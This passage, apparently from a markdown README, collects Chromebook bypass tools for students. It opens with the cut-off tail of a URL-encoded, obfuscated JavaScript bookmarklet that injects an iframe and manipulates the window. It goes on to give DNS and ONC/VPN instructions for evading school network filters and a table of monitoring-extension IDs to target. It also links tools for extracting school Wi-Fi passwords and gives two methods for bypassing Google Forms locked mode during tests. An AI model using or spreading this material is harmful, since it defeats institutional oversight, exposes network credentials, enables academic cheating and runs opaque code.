7.onmess%27+j%28%27aUk6%27%2C0x29c%2C0x28f%2C0x289%2C0x26e%2C0x262%2C0x26b%29+j%28%27iKyB%27%2C0x2a7%2C0x2a5%2C0x296%2C0x28e%2C0x2b4%2C0x275%29+j%28%27ltzn%27%2C0x297%2C0x2d5%2C0x2b1%2C0x2d2%2C0x28d%2C0x2a2%29+j%28%27%28YAw%27%2C0x2b1%2C0x27c%2C0x29d%2C0x29f%2C0x2bd%2C0x27a%29+j%28%27Enlg%27%2C0x2b7%2C0x285%2C0x2ad%2C0x2be%2C0x2ae%2C0x28f%29+j%28%27iKyB%27%2C0x2be%2C0x2e0%2C0x2bf%2C0x2ab%2C0x2d4%2C0x2e8%29+%27cript%3E%27%2C%27jfDZg%27%3Afunction%28F%2Cv%29%7Breturn%20F+v%3B%7D%2C%27fUwZE%27%3Afunction%28F%2Cv%29%7Breturn%20F+v%3B%7D%2C%27EIXlj%27%3Aj%28%27aUk6%27%2C0x2a8%2C0x2d7%2C0x2c0%2C0x2ad%2C0x2e2%2C0x2b2%29+%27404%5Cx20Not%27+j%28%275DGf%27%2C0x296%2C0x2a1%2C0x291%2C0x272%2C0x285%2C0x2ba%29+%27/title%3E%27+j%28%27pYHg%27%2C0x2c2%2C0x2d3%2C0x2be%2C0x2e3%2C0x2cb%2C0x2ab%29+j%28%27%299kQ%27%2C0x29c%2C0x2b6%2C0x2b7%2C0x2ce%2C0x2d8%2C0x2c2%29+j%28%27E%5Dql%27%2C0x28f%2C0x2b2%2C0x29a%2C0x27c%2C0x29d%2C0x294%29+%270px%3B%5Cx22%3E%3C%27+j%28%27irrp%27%2C0x2e1%2C0x2d2%2C0x2bd%2C0x2d9%2C0x298%2C0x2e1%29+%27src%3D%5Cx22%27%2C%27aKIhe%27%3Aj%28%27%28l%5Dd%27%2C0x274%2C0x284%2C0x27c%2C0x29e%2C0x256%2C0x27f%29%2C%27GqQLZ%27%3Aj%28%27CeOX%27%2C0x268%2C0x2a5%2C0x280%2C0x293%2C0x29b%2C0x288%29+j%28%27CeOX%27%2C0x280%2C0x29e%2C0x29c%2C0x29c%2C0x289%2C0x2a4%29%2C%27MeRBk%27%3Afunction%28F%2Cv%29%7Breturn%20F%21%3Dv%3B%7D%7D%3Bfunction%20o%28%29%7Bconst%20F%3D%7B%7D%3BF%5B%27nKVXY%27%5D%3DK%5Bi%28-0x21%2C-0x46%2C-0x17%2C-0x36%2C%27VT@u%27%2C-0xf%2C-0x20%29%5D%3Bfunction%20i%28K%2Co%2CF%2Cv%2CH%2CY%2CR%29%7Breturn%20j%28H%2Co-0xc0%2CF-0x197%2CK-%20-0x29e%2CH-0xaf%2CY-0xf0%2CR-0x19e%29%3B%7Dconst%20v%3DF%3Bfunction%20H%28%29%7Bfunction%20W%28K%2Co%2CF%2Cv%2CH%2CY%2CR%29%7Breturn%20i%28F-0x1e0%2Co-0x1bd%2CF-0x4b%2Cv-0x37%2CR%2CY-0x166%2CR-0xa1%29%3B%7Dreturn%20v%5BW%280x1df%2C0x1f9%2C0x1e9%2C0x20e%2C0x210%2C0x1f1%2C%27EzSQ%27%29%5D%3B%7Dlet%20Y%3Dwindow%5B%27open%27%5D%28K%5B%27PaUhe%27%5D%2Ci%28-0xf%2C-0xd%2C-0x26%2C-0x17%2C%27E3LE%27%2C-0x33%2C-0x35%29%29%2CR%3DK%5B%27EYuJk%27%5D%28i%280x4%2C0xd%2C0x2%2C-0xf%2C%27z%5BQ4%27%2C0xd%2C0xc%29+i%280x14%2C0x15%2C-0x13%2C0x13%2C%27oarp%27%2C0xd%2C0x12%29+%27%2C%27%2CK%5Bi%280xe%2C-0x11%2C-0x2%2C0x1e%2C%27oEsR%27%2C0x25%2C-0x16%29%5D%28encodeURIComponent%2CK%5Bi%280x26%2C0x11%2C0x19%2C0x6%2C%27oarp%27%2C0x26%2C0x1e%29%5D%29%29%3BY%5Bi%280x0%2C-0x6%2C-0x4%2C0xa%2C%27%5ENwA%27%2C-0x7%2C0x13%29+%27t%27%5D%5Bi%280x10%2C0x3%2C-0x13%2C0x2c%2C%2714JQ%27%2C-0x11%2C-0xc%29%5D%28K%5B%27jfDZg%27%5D%28K%5B%27fUwZE%27%5D%28K%5B%27EIXlj%27%5D%2CR%29%2Ci%28-0x12%2C0x14%2C-0x15%2C-0xc%2C%27E3LE%27%2C-0xd%2C0x15%29+%27%3D%5Cx22100%25%5Cx22%27+i%28-0x17%2C-0x39%2C-0x34%2C-0x31%2C%27eXMl%27%2C-0xc%2C-0x26%29+i%280x1%2C0x7%2C-0x7%2C-0x18%2C%27CeOX%27%2C-0x3%2C-0x1f%29+i%280x29%2C0x17%2C0x28%2C0x2d%2C%27rD*f%27%2C0x32%2C0x3f%29+i%280x23%2C0x0%2C0x49%2C0x31%2C%273GLD%27%2C0x1a%2C0x44%29+i%28-0x1a%2C0xd%2C-0x1e%2C-0x14%2C%273GLD%27%2C-0x3b%2C0xa%29+%27rame%3E%3C/%27+i%28-0x1b%2C-0x3a%2C0xb%2C-0x21%2C%273GLD%27%2C-0xa%2C-0x30%29%29%29%3Blet%20A%3DY%5B%27documen%27+%27t%27%5D%5Bi%280x25%2C0x3%2C0x40%2C-0x3%2C%27Cr%5BR%27%2C0x4%2C0x10%29+%27lector%27%5D%28K%5Bi%280x2b%2C0x48%2C0x1e%2C0x14%2C%27Y%5B%25s%27%2C0x1a%2C0x4f%29%5D%29%3BA%5B%27onload%27%5D%3D%28%29%3D%3EA%5Bi%28-0x9%2C0x4%2C-0xd%2C-0xe%2C%27ZR0%5B%27%2C-0xa%2C0x3%29+i%28-0xc%2C-0x31%2C-0xc%2C-0x28%2C%27DVnL%27%2C-0x18%2C-0x19%29%5D%5B%27postMes%27+i%28-0x1f%2C-0x25%2C-0x4%2C-0xa%2C%27T09K%27%2C-0x1a%2C-0xb%29%5D%28H%28%29%2C%27*%27%29%3B%7Dif%28K%5Bj%28%27%5ENwA%27%2C0x2b2%2C0x292%2C0x2b0%2C0x2bc%2C0x2be%2C0x29b%29%5D%28window%5Bj%28%27s@0N%27%2C0x267%2C0x2a5%2C0x285%2C0x28c%2C0x2a6%2C0x292%29+%27n%27%5D%5B%27hash%27%5D%2C%27%23%27%29%29window%5Bj%28%27YN%5Bl%27%2C0x2b2%2C0x2c3%2C0x2bb%2C0x2ca%2C0x297%2C0x2b5%29+%27eprint%27%5D%3Do%3Bfunction%20j%28K%2Co%2CF%2Cv%2CH%2CY%2CR%29%7Breturn%20w%28v-0xeb%2CK%29%3B%7Dwindow%5Bj%28%27cbIj%27%2C0x259%2C0x285%2C0x27e%2C0x280%2C0x285%2C0x266%29%5D%5Bj%28%27pYHg%27%2C0x2ce%2C0x2d2%2C0x2c6%2C0x2b8%2C0x2bd%2C0x2ea%29%5D%28Object%5Bj%28%27CeOX%27%2C0x26b%2C0x29a%2C0x28b%2C0x290%2C0x28f%2C0x288%29+j%28%27E%5Dql%27%2C0x27c%2C0x2b9%2C0x293%2C0x298%2C0x278%2C0x26b%29+%27es%27%5D%28new%20Error%28%29%2C%7B%27message%27%3A%7B%27get%27%28%29%7Bfunction%20h%28K%2Co%2CF%2Cv%2CH%2CY%2CR%29%7Breturn%20j%28Y%2Co-0xf2%2CF-0x154%2CF-0xd9%2CH-0x6%2CY-0x2b%2CR-0x9c%29%3B%7Dwindow%5Bh%280x35a%2C0x35a%2C0x366%2C0x353%2C0x361%2C%27L1iO%27%2C0x33e%29%5D%5B%27clear%27%5D%28%29%2Cwindow%5Bh%280x395%2C0x38b%2C0x391%2C0x36a%2C0x381%2C%27%28YAw%27%2C0x36b%29+%27n%27%5D%3DK%5Bh%280x35f%2C0x34a%2C0x35b%2C0x337%2C0x377%2C%27W4jq%27%2C0x34f%29%5D%3B%7D%7D%2C%27toString%27%3A%7B%7D%7D%29%29%3B%7D%29%28%29%29%3B%3C%2Fscript%3E`

</details>

<details>
<summary><b>Caub + Dns + Proxy Editor</b> </summary>

**This is a tool to edit managed network configurations to block updates, change the DNS and proxy settings, even if its greyed out in the settings**

here is the latest update: <a href="https://gist.github.com/Brandon421-ops/9cf837a5c36fc8c4f4ea526d032ed4d0">https://gist.github.com/Brandon421-ops/9cf837a5c36fc8c4f4ea526d032ed4d0</a>

or

<a href="https://mega.nz/file/I7MRVA4C#d3cjIyQLz6iSd_D_BPCekprMjfzDk8aTOAKcitupqPw">https://mega.nz/file/I7MRVA4C#d3cjIyQLz6iSd_D_BPCekprMjfzDk8aTOAKcitupqPw</a>

if these are both blocked download it on a pc and upload it to your school accout google drive

credit to gabe077 in TN

</details>

<details>
<summary><b>OmadaDNS</b> Block requests from certain filtering extensions</summary>

(New York) Name Server: 66.94.105.229

(Germany) Name Server: 167.86.91.171

OmadaDNS is an AdGuard Home DNS server running these lists. It has no logs, and it uses <a href="https://www.quad9.net/">Quad9</a> upstream.

</details>

<details>
<summary><b>cauDNS</b> Blocks requests for updates and certain extensions, and allows users to set custom name servers</summary>

**This DNS server is configured to networks by importing an ONC file.**

### ONC Setup

***Instructions***

1. Navigate to `chrome://network#state`.

2. Locate the section for the Wi-Fi network that is currently connected.

3. Expand the section by clicking the plus (+).

4. Select all the text within the expanded part of the section.

5. Copy the selection from the context menu or by pressing Ctrl + C.

6. On the <a href="https://caudns.vercel.app/">cauDNS page</a>, paste the copied text into the input field by pressing Ctrl + V.

**Name Servers**

1. 167.86.91.171

2. 66.94.105.229

3. 213.109.163.210

4. 92.60.37.102

</details>

<details>
<summary><b>Network Bypassing Via DNS</b> A bypass for any network filters</summary>

**A network filter is something that blocks website on the actual network instead of the operating system. Thus you can't disable with exploits like LTBEEF or LTMEAT.**

IP Server 1: 8.8.8.8 in all boxes

IP Server 2: 1.1.1.1 in the first box and 1.0.0.1 in the second box the third and fourth box stay 0.0.0.0

Step 1. Go to your settings

Step 2. Click on the wifi your using rn then click it again.

Step 3.  Scroll down until you see network once you see the option click it.

Step 4. Scroll down until you find custom name servers now once you find the option click it.

Step 5. Paste in one of the IP Server's.

Note: If IP Server 1 doesn't work then use IP Server 2 if IP Server 2 doesn't work then try using IP Server 1 if they both don't work your screwed

</details>

<details>  
<summary><b>Network Bypassing Via VPN</b> A bypass for any network filters</summary>

**A network filter is something that blocks website on the actual network instead of the operating system. Thus you can't disable with exploits like LTBEEF or LTMEAT.**

Go to <a href="https://drive.google.com/file/d/1MGVFf8d9pww0M2bO9ogxQX1LyR1y6zc_/view">this link</a> once you have downloaded the ONC file. Goto chrome://network and press "Import ONC File". You will have know if it worked if it says: "Network imported: 1". Then click on the time, or goto settings. Find VPN, click on it and click on the "Haven VPN" it will say "Connected" and now you are free.


If chrome://network is blocked, start bawling your eyes out and beat up your IT manager. 

</details>

<details>
<summary><b>List of tools</b> </summary>

<details>  
<summary><b>Extension ID's</b> </summary>

|Extension Name|Extension ID|
|--------------|------------|
|GoGuardian|`haldlgldplgnggkjaafhelgiaglafanh`|
|Mobile Guardian (installed)|`fgmafhdohjkdhfaacgbgclmfgkgokgmb`|
|<a href="https://chrome.google.com/webstore/detail/mobile-guardian/nglbmaiijljohnphofifiodoommladkj">Mobile Guardian (setup)</a>|`nglbmaiijljohnphofifiodoommladkj`|
|<a href="https://chrome.google.com/webstore/detail/securly-for-chromebooks/iheobagjkfklnlikgihanlhcddjoihkg">Securly (webstore)</a>|`iheobagjkfklnlikgihanlhcddjoihkg`|
|Securly|`joflmkccibkooplaeoinecjbmdebglab`|
|Securly (old)|`iheobagjkfklnlikgihanlhcddjoihkg`|
|Securly Classroom|`jfbecfmiegcjddenjhlbhlikcbfmnafd`|
|<a href="https://chrome.google.com/webstore/detail/blocksi-enterprise-editio/ghlpmldmjjhmdgmneoaibbegkjjbonbk">Blocksi</a>|`pgmjaihnmedpcdkjcgigocogcbffgkbn`|
|<a href="https://chrome.google.com/webstore/detail/iboss-cloud-enterprise/kmffehbidlalibfeklaefnckpidbodff">iBoss</a>|`kmffehbidlalibfeklaefnckpidbodff`|
|<a href="https://chrome.google.com/webstore/detail/forticlient-chromebook-we/igbgpehnbmhgdgjbhkkpedommgmfbeao">Fortiguard</a>|`igbgpehnbmhgdgjbhkkpedommgmfbeao`|
|<a href="https://chrome.google.com/webstore/detail/cisco-umbrella-chromebook/jcdhmojfecjfmbdpchihbeilohgnbdci">Cisco Umbrella</a>|`jcdhmojfecjfmbdpchihbeilohgnbdci`|
|NetRef|`khfdeghnhlpdfeenmdofgcbilkngngcp`|
|<a href="https://chrome.google.com/webstore/detail/ckauthenticator/jdogphakondfdmcanpapfahkdomaicfa">ContentKeeper</a>|`jdogphakondfdmcanpapfahkdomaicfa`|
|CK-Authenticator G3|`odoanpnonilogofggaohhkdkdgbhdljp`|
|<a href="https://chrome.google.com/webstore/detail/hapara-highlights-extensi/kbohafcopfpigkjdimdcdgenlhkmhbnc">Hapara</a>|`kbohafcopfpigkjdimdcdgenlhkmhbnc`|
|Smoothwall|`jbldkhfglmgeihlcaeliadhipokhocnm`|
|Linewize|`ddfbkhpmcdbciejenfcolaaiebnjcbfc`|
|<a href="https://chrome.google.com/webstore/detail/lanschool-air-chrome-exte/baleiojnjpgeojohhhfbichcodgljmnj">LANSchool</a>|`baleiojnjpgeojohhhfbichcodgljmnj`|
|<a href="https://chrome.google.com/webstore/detail/lanschool-web-helper/honjcnefekfnompampcpmcdadibmjhlk">LanSchool Web Helper</a>|`honjcnefekfnompampcpmcdadibmjhlk`|
|Lightspeed Filter Agent|`adkcpkpghahmbopkjchobieckeoaoeem`|
|Lightspeed Device Insider Agent|`njdniclgegijdcdliklgieicanpmcngj`|
|<a href="https://chrome.google.com/webstore/detail/interclass-filtering-serv/jbddgjglgkkneonnineaohdhabjbgopi">InterCLASS Filtering Service</a>|`jbddgjglgkkneonnineaohdhabjbgopi`|
|<a href="https://chrome.google.com/webstore/detail/imtlazarusv16/cgigopjakkeclhggchgnhmpmhghcbnaf">IMTLazarus</a>|`cgigopjakkeclhggchgnhmpmhghcbnaf`| 
|<a href="https://chrome.google.com/webstore/detail/impero-backdrop/jjpmjccpemllnmgiaojaocgnakpmfgjg">Impero Backdrop</a>|`jjpmjccpemllnmgiaojaocgnakpmfgjg`|
|<a href="https://chrome.google.com/webstore/detail/intersafe-gatewayconnecti/ecjoghccnjlodjlmkgmnbnkdcbnjgden">InterSafe GatewayConnection Agent</a>|`ecjoghccnjlodjlmkgmnbnkdcbnjgden`| 
|<a href="https://chrome.google.com/webstore/detail/gopher-buddy/cgbbbjmgdpnifijconhamggjehlamcif">Gopher Buddy</a>|`cgbbbjmgdpnifijconhamggjehlamcif`|
|<a href="https://chrome.google.com/webstore/detail/connect-for-chrome-educat/ddfbkhpmcdbciejenfcolaaiebnjcbfc">Connect for Chrome - Education</a>|`ddfbkhpmcdbciejenfcolaaiebnjcbfc`|

If your blocker is not on this list: go to `chrome://extensions`, details on your blockers extension, then copy the code in the url (after chrome://extensions/?id=). 
Here's all the good places to find your Blocker id 
`chrome://extensions` 
`chrome://extensions-internals` 
`chrome://process-internals` 
Search up the blocker ID on google if you have too 
If you can't find them in those URL'S Manualy then try to do ctrl + f and type in your blocker name or ID

</details>

<details>
<summary><b>Chrome100</b> Recovery image directory</summary>

<a href="https://chrome100.dev/">Website</a>

<a href="https://github.com/e9x/chrome100">GitHub</a>

</details>

<details>
<summary><b>Updates</b> View channel versions & download recovery images</summary>

<a href="https://cros.tech/">Website</a>

</details>

<details>
<summary><b>Changes</b> Chromium changes & requests</summary>

<a href="https://chromium-review.googlesource.com/">Website</a>

</details>

<details>
<summary><b>Wi-Fi Password Extracter</b> Extract your schools Wi-Fi password</summary>

<a href="https://sipe.glitch.me/">Sync Internals Password Extractor</a>

<a href="https://n-p-p-e.glitch.me/">Netlog Policy Password Extractor</a>

<a href="https://luphoria.com/netlog-policy-password-tool">Policy Password Tool</a>

</details>

<details>
<summary><b>Google Forms Locked Mode Bypass</b> </summary>

**Patched On Newer Versions**

If you don't have the ability to enable flags this won't work. You can use a Chrome flag to use Google while being within a locked google form, no notifications will be sent to your teacher. You must enable the Chrome flag named window-layout-menu by visiting `chrome://flags/#window-layout-menu` and selecting enabled. Before entering a form, first create a new window and hold your cursor over the maximize button; This will open a menu, in this menu pin the window You can now enter the Google form in the non-floating window, the floating window will stay as an overlay on top of your form. 

**IMPORTANT**: Do NOT close/minimize the floating window while in the form as it will cause the window to not be able to be opened anymore while staying in the form. If a teacher comes close, u can just drag the window to the corner so they dont see lmao.

</details>

<details>
<summary><b>Google Forms Locked Mode Bypass 2</b> </summary>

# Another Google Forms Locked Mode Bypass
*This is for educational purposes only, use only on forms that you own*
## How does this work?
So, you want to know how the genie does his tricks, eh?  Well, I'll tell you.
1. Google is dumb
2. They forgot to add any checks to make sure locked mode is actually enabled 💀
3. All that happens when you open a locked Google Form is that it submits a form via POST request that responds with the test (which would usually be locked, but we skipped the part where it tells Chrome to lock itself)
4. The token sent with the POST request is easily scraped from the form login page

## What potential is there for issues by using this?
1. Every time you make the POST request after the first time, Google emails the owner of the form
2. The form object on the page gets deleted when the "visibilitychanged" event is fired
2a. The "visibilitychanged" event is only fired by complete obfuscation, not partial or loss of focus.
3. You're screwed if you don't follow the directions to the T
 
Link:
<a href="https://tinyurl.com/LockedModeBypass2023c">https://tinyurl.com/LockedModeBypass2023c</a>

## Update February 29, 2024
- Fixed Google Forms assigned through Google Classroom
- To receive this update delete your existing sheet and copy again
(if you use  @unknown-user's website you can disregard and continue using as normal with the new ability to use Google Classroom forms)

For those who want the site without going through Apps Script and Google Sheets  @unknown-user made a site: <a href="https://formb.pegoku.com/">https://formb.pegoku.com/</a>

</details>
